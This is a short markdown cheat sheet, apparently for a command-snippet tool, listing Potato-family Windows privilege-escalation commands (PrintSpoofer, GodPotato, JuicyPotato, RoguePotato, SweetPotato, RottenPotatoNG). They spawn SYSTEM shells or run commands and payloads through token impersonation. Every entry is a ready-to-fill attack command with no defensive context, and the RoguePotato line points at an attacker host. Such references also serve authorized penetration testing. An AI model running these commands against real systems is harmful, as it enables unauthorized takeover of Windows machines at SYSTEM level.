# Potato / PrintSpoofer

## PrintSpoofer

### Interactive SYSTEM shell

Spawn interactive SYSTEM shell with Potato / PrintSpoofer.

```cmd title:"Potato / PrintSpoofer Spawn Interactive SYSTEM Shell"
PrintSpoofer.exe -i -c cmd
```
<!-- cheat -->

### Execute command

Execute command with Potato / PrintSpoofer.

```cmd title:"Potato / PrintSpoofer Execute Command"
PrintSpoofer.exe -c "$command"
```
<!-- cheat
var command
-->

## GodPotato

### Execute command 2

Execute command 2 with Potato / PrintSpoofer.

```cmd title:"Potato / PrintSpoofer Execute Command 2"
GodPotato.exe -cmd "$command"
```
<!-- cheat
var command
-->

## JuicyPotato

### Default trigger

Execute default trigger with Potato / PrintSpoofer.

```cmd title:"Potato / PrintSpoofer Execute Default Trigger"
JuicyPotato.exe -l $listen_port -p C:\Windows\System32\cmd.exe -a "/c $command" -t *
```
<!-- cheat
var listen_port
var command
-->

### Explicit CLSID

Execute explicit CLSID with Potato / PrintSpoofer.

```cmd title:"Potato / PrintSpoofer Execute Explicit CLSID"
JuicyPotato.exe -l $listen_port -p "$payload_path" -t * -c "$clsid"
```
<!-- cheat
var listen_port
var payload_path
var clsid
-->

## RoguePotato

### Execute command 3

Execute command 3 with Potato / PrintSpoofer.

```cmd title:"Potato / PrintSpoofer Execute Command 3"
RoguePotato.exe -r $lhost -e "$command" -l $listen_port
```
<!-- cheat
import tun_ip
var command
var listen_port
-->

## SweetPotato

### Execute payload

Execute payload with Potato / PrintSpoofer.

```cmd title:"Potato / PrintSpoofer Execute Payload"
SweetPotato.exe -p "$payload_path"
```
<!-- cheat
var payload_path
-->

## RottenPotatoNG

### Trigger token impersonation

Trigger token impersonation with Potato / PrintSpoofer.

```cmd title:"Potato / PrintSpoofer Trigger Token Impersonation"
RottenPotatoNG.exe
```
<!-- cheat -->
